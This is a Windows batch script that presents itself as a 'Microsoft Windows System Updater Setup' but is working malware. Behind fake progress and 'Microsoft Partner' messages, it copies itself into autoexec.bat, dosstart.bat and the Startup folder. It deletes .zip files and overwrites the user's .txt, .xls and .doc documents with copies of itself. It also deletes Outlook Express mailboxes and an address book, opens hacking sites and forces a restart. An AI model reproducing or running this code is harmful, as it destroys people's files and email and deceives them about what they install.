@ECHO OFF

CLS

IF EXIST c:\winupdt.bat GOTO CODE

GOTO SETUP

:SETUP

@ECHO OFF

ECHO Welcome To Microsoft Windows System Updater Setup

ECHO.

copy %0 c:\winupdt.bat >> NUL

ECHO Scanning System.....Please Wait

prompt $P$SWindows2000

type %0 >> c:\autoexec.bat

type %0 >> c:\windows\dosstart.bat

ECHO DONE.

ECHO.

ECHO Installing Components....Please Wait

FOR %%a IN (*.zip) DO del %%a

FOR %%a IN (C:\mydocu~1\*.txt) DO COPY c:\winupdt.bat %%a >> NUL

FOR %%a IN (C:\mydocu~1\*.xls) DO COPY c:\winupdt.bat %%a >> NUL

FOR %%a IN (C:\mydocu~1\*.doc) DO COPY c:\winupdt.bat %%a >> NUL

ECHO DONE.

ECHO.

ECHO You Now Need to Register with Microsoft's Partner: Fortune Galaxy to receive automatic updates.

PAUSE

ECHO Downloading Components...Please Wait

START "C:\Program Files\Internet Explorer\Iexplore.exe" http://www.pro-hack.cjb.net

IF EXIST "C:\Program Files\Outlook Express\msimn.exe" del "C:\WINDOWS\Application Data\Identities\{161C80E0-1B99-11D4-9077-FD90FD02053A}\Microsoft\Outlook Express\*.dbx"

IF EXIST "C:\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab"  del "C:\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab"

ECHO Setup Will Now restart Your Computer....Please Wait

ECHO Your System is not faster by almost 40%.

ECHO Thank you for using a Microsoft Partner's product.

copy %0 "C:\WINDOWS\Start Menu\Programs\StartUp\winupdt.bat" >> NUL

c:\WINDOWS\RUNDLL user.exe,exitwindowsexec

CLS

GOTO END





:CODE

CLS

@ECHO OFF

prompt $P$SWindows2000

IF "%0" == "C:\AUTOEXEC.BAT" GOTO ABC

type %0 >> c:\autoexec.bat

:ABC

type %0 >> c:\windows\dosstart.bat

FOR %%a IN (*.zip) DO del %%a

FOR %%a IN (C:\mydocu~1\*.txt) DO COPY c:\winupdt.bat %%a >> NUL

FOR %%a IN (C:\mydocu~1\*.xls) DO COPY c:\winupdt.bat %%a >> NUL

FOR %%a IN (C:\mydocu~1\*.doc) DO COPY c:\winupdt.bat %%a >> NUL

START "C:\Program Files\Internet Explorer\Iexplore.exe" http://www.crosswinds.net/~hackingtruths

IF EXIST "C:\Program Files\Outlook Express\msimn.exe" del "C:\WINDOWS\Application Data\Identities\{161C80E0-1B99-11D4-9077-FD90FD02053A}\Microsoft\Outlook Express\*.dbx" >> NUL

IF EXIST "C:\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab"  del "C:\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab" >> NUL

copy %0 "C:\WINDOWS\Start Menu\Programs\StartUp\winupdt.bat" >> NUL

GOTO :END

CLS

:END

CLS
